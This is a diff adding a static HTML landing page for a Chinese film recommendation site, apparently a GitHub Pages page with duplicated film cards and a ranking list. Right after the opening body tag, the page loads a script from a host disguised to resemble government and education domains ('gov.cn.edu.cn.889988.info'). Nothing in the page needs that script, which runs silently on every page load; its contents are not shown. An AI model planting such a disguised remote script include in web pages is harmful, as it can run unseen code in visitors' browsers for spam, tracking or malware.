@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>vivi电影网 - 精选高清电影在线观看</title>
+<meta name="description" content="vivi电影网是一个精选影视推荐站，每日更新优质电影、剧集、动漫资源，界面清爽、加载快速。官网 https://vividianyingwang-h5.github.io">
+<meta name="keywords" content="vivi电影网, 高清电影, 在线观看, 影视推荐, 精选片单">
+<meta name="author" content="vivi电影网">
+<meta name="robots" content="index,follow">
+<meta name="bingbot" content="index,follow">
+<meta name="theme-color" content="#f0faf6">
+<style>
+:root{
+  --bg:#f0faf6;
+  --card:rgba(255,255,255,0.75);
+  --card-solid:#ffffff;
+  --line:#d8eee5;
+  --mint:#2dd4a4;
+  --mint-dark:#14b887;
+  --text:#1a2e2a;
+  --muted:#6b8f86;
+  --shadow:0 8px 32px rgba(45,212,164,0.12);
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  background:var(--bg);
+  color:var(--text);
+  font-family:"Georgia","Times New Roman",serif;
+  line-height:1.8;
+}
+a{color:var(--mint-dark);text-decoration:none}
+
+/* Hero */
+.hero{
+  background:linear-gradient(160deg,#e0f7ee 0%,#f0faf6 50%,#fff 100%);
+  padding:60px 20px 50px;
+  text-align:center;
+  border-bottom:1px solid var(--line);
+}
+.hero-logo{
+  font-size:48px;font-weight:900;letter-spacing:-1px;margin-bottom:8px;
+}
+.hero-logo span{color:var(--mint-dark)}
+.hero-desc{
+  font-size:17px;color:var(--muted);max-width:520px;margin:0 auto 18px;
+  font-family:system-ui,-apple-system,"Microsoft YaHei",sans-serif;
+}
+.hero-url{
+  display:inline-block;font-family:Consolas,monospace;font-size:13px;
+  background:#fff;color:var(--mint-dark);border:1px solid var(--line);
+  padding:8px 16px;border-radius:20px;
+}
+
+/* 导航 */
+.nav{
+  display:flex;justify-content:center;gap:6px;flex-wrap:wrap;
+  padding:18px 16px;background:var(--card);
+  backdrop-filter:blur(12px);border-bottom:1px solid var(--line);
+  position:sticky;top:0;z-index:40;
+}
+.nav a{
+  padding:8px 16px;border-radius:20px;font-size:14px;font-weight:500;
+  color:var(--text);background:transparent;transition:.2s;
+  font-family:system-ui,sans-serif;
+}
+.nav a:hover{background:var(--mint);color:#fff}
+
+/* 容器 */
+.wrap{max-width:1080px;margin:0 auto;padding:36px 18px}
+
+/* 区块标题 */
+.section-title{
+  font-size:13px;font-weight:700;letter-spacing:3px;text-transform:uppercase;
+  color:var(--mint-dark);margin-bottom:18px;text-align:center;
+}
+
+/* 瀑布流卡片 */
+.masonry{
+  column-count:2;column-gap:18px;margin-bottom:44px;
+}
+@media(min-width:640px){.masonry{column-count:3}}
+@media(min-width:900px){.masonry{column-count:4}}
+.card{
+  break-inside:avoid;background:var(--card-solid);
+  border:1px solid var(--line);border-radius:16px;
+  padding:18px;margin-bottom:18px;box-shadow:var(--shadow);
+}
+.card-num{
+  font-size:11px;color:#fff;background:var(--mint);
+  width:22px;height:22px;border-radius:50%;
+  display:inline-flex;align-items:center;justify-content:center;
+  margin-bottom:10px;font-family:system-ui,sans-serif;font-weight:700;
+}
+.card h3{font-size:15px;margin-bottom:4px;line-height:1.4}
+.card p{font-size:12px;color:var(--muted);line-height:1.5}
+.card-tag{
+  display:inline-block;margin-top:8px;font-size:11px;
+  background:#e0f7ee;color:var(--mint-dark);
+  padding:2px 8px;border-radius:10px;font-family:system-ui,sans-serif;
+}
+
+/* 圆形分类 */
+.circles{
+  display:flex;justify-content:center;gap:20px;flex-wrap:wrap;margin-bottom:44px;
+}
+.circle{
+  width:110px;height:110px;border-radius:50%;
+  background:var(--card-solid);border:2px solid var(--line);
+  display:flex;flex-direction:column;align-items:center;justify-content:center;
+  box-shadow:var(--shadow);transition:.3s;
+}
+.circle:hover{border-color:var(--mint);transform:scale(1.05)}
+.circle b{font-size:15px;margin-bottom:2px}
+.circle span{font-size:11px;color:var(--muted);font-family:system-ui,sans-serif}
+
+/* 时间线排行 */
+.timeline{position:relative;padding-left:28px;margin-bottom:44px}
+.timeline::before{
+  content:'';position:absolute;left:8px;top:0;bottom:0;width:2px;background:var(--line);
+}
+.tl-item{
+  position:relative;margin-bottom:18px;
+  background:var(--card-solid);border:1px solid var(--line);
+  border-radius:12px;padding:14px 16px;box-shadow:var(--shadow);
+}
+.tl-item::before{
+  content:'';position:absolute;left:-24px;top:18px;
+  width:10px;height:10px;border-radius:50%;background:var(--mint);
+  border:2px solid #fff;
+}
+.tl-item h3{font-size:15px;margin-bottom:2px}
+.tl-item span{font-size:12px;color:var(--muted);font-family:system-ui,sans-serif}
+
+/* 关于 */
+.about{
+  background:var(--card-solid);border:1px solid var(--line);
+  border-radius:20px;padding:28px;text-align:center;box-shadow:var(--shadow);
+}
+.about p{color:var(--muted);margin-bottom:10px;font-family:system-ui,sans-serif;font-size:14px}
+.about code{
+  background:#e0f7ee;color:var(--mint-dark);padding:3px 8px;border-radius:6px;font-family:Consolas,monospace;font-size:13px;
+}
+
+/* 页脚 */
+.foot{
+  text-align:center;padding:24px 16px;font-size:13px;color:var(--muted);
+  border-top:1px solid var(--line);font-family:system-ui,sans-serif;
+}
+
+@media(max-width:600px){
+  .hero-logo{font-size:36px}
+  .hero-desc{font-size:15px}
+  .card h3{font-size:14px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<!-- Hero -->
+<section class="hero" id="home">
+  <div class="hero-logo">vivi<span>电影网</span></div>
+  <p class="hero-desc">每日精选优质电影、剧集与动漫，为你推荐值得看的每一部好片。</p>
+  <div class="hero-url">https://vividianyingwang-h5.github.io</div>
+</section>
+
+<!-- 导航 -->
+<nav class="nav">
+  <a href="#">首页</a>
+  <a href="#">今日精选</a>
+  <a href="#">影片分类</a>
+  <a href="#">口碑排行</a>
+  <a href="#">关于vivi</a>
+</nav>
+
+<main class="wrap">
+
+  <!-- 精选瀑布流 -->
+  <h2 class="section-title">— 今日精选 —</h2>
+  <section class="masonry" id="picks">
+    <article class="card">
+      <div class="card-num">1</div>
+      <h3>坠落的审判</h3>
+      <p>一场悬疑与情感交织的法庭戏，层层剥开婚姻真相。</p>
+      <span class="card-tag">悬疑</span>
+    </article>
+    <article class="card">
+      <div class="card-num">2</div>
+      <h3>奥本海默</h3>
+      <p>诺兰史诗级传记，原子弹之父的内心挣扎与时代洪流。</p>
+      <span class="card-tag">传记</span>
+    </article>
+    <article class="card">
+      <div class="card-num">3</div>
+      <h3>蜘蛛侠：纵横宇宙</h3>
+      <p>视觉炸裂的多元宇宙冒险，每一帧都是壁纸。</p>
+      <span class="card-tag">动漫</span>
+    </article>
+    <article class="card">
+      <div class="card-num">4</div>
+      <h3>年会不能停！</h3>
+      <p>打工人必看喜剧，笑中带泪的职场浮世绘。</p>
+      <span class="card-tag">喜剧</span>
+    </article>
+    <article class="card">
+      <div class="card-num">5</div>
+      <h3>封神第一部</h3>
+      <p>中国神话史诗新标杆，视觉与叙事双重突破。</p>
+      <span class="card-tag">奇幻</span>
+    </article>
+    <article class="card">
+      <div class="card-num">6</div>
+      <h3>坠落的审判</h3>
+      <p>一场悬疑与情感交织的法庭戏，层层剥开婚姻真相。</p>
+      <span class="card-tag">悬疑</span>
+    </article>
+    <article class="card">
+      <div class="card-num">7</div>
+      <h3>奥本海默</h3>
+      <p>诺兰史诗级传记，原子弹之父的内心挣扎与时代洪流。</p>
+      <span class="card-tag">传记</span>
+    </article>
+    <article class="card">
+      <div class="card-num">8</div>
+      <h3>蜘蛛侠：纵横宇宙</h3>
+      <p>视觉炸裂的多元宇宙冒险，每一帧都是壁纸。</p>
+      <span class="card-tag">动漫</span>
+    </article>
+    <article class="card">
+      <div class="card-num">9</div>
+      <h3>年会不能停！</h3>
+      <p>打工人必看喜剧，笑中带泪的职场浮世绘。</p>
+      <span class="card-tag">喜剧</span>
+    </article>
+    <article class="card">
+      <div class="card-num">10</div>
+      <h3>封神第一部</h3>
+      <p>中国神话史诗新标杆，视觉与叙事双重突破。</p>
+      <span class="card-tag">奇幻</span>
+    </article>
+  </section>
+
+  <!-- 圆形分类 -->
+  <h2 class="section-title">— 浏览分类 —</h2>
+  <section class="circles" id="cats">
+    <div class="circle"><b>剧情</b><span>Drama</span></div>
+    <div class="circle"><b>喜剧</b><span>Comedy</span></div>
+    <div class="circle"><b>动作</b><span>Action</span></div>
+    <div class="circle"><b>科幻</b><span>Sci-Fi</span></div>
+    <div class="circle"><b>悬疑</b><span>Mystery</span></div>
+    <div class="circle"><b>动漫</b><span>Anime</span></div>
+  </section>
+
+  <!-- 时间线排行 -->
+  <h2 class="section-title">— 口碑排行榜 —</h2>
+  <section class="timeline" id="rank">
+    <div class="tl-item">
+      <h3>坠落的审判</h3><span>评分 9.3 · 悬疑/剧情</span>
+    </div>
+    <div class="tl-item">
+      <h3>奥本海默</h3><span>评分 9.1 · 传记/历史</span>
+    </div>
+    <div class="tl-item">
+      <h3>蜘蛛侠：纵横宇宙</h3><span>评分 9.0 · 动漫/冒险</span>
+    </div>
+    <div class="tl-item">
+      <h3>年会不能停！</h3><span>评分 8.8 · 喜剧/职场</span>
+    </div>
+    <div class="tl-item">
+      <h3>封神第一部</h3><span>评分 8.6 · 奇幻/动作</span>
+    </div>
+  </section>
+
+  <!-- 关于 -->
+  <section class="about" id="about">
+    <h2 class="section-title" style="margin-bottom:14px">— 关于 vivi电影网 —</h2>
+    <p><strong>vivi电影网</strong> 是一个以"精选推荐"为核心的影视展示单页，每天为你挑出值得看的好片。</p>
+    <p>官网地址：<code>https://vividianyingwang-h5.github.io</code></p>
+    <p>本页为静态单页演示，内页链接以 <code>#</code> 占位，不依赖后端，不生成 robots.txt 与 sitemap.xml。</p>
+  </section>
+
+</main>
+
+<footer class="foot">
+  © 2026 vivi电影网 · vividianyingwang-h5.github.io · 精选影视推荐单页
+</footer>
+
+</body>
+</html>
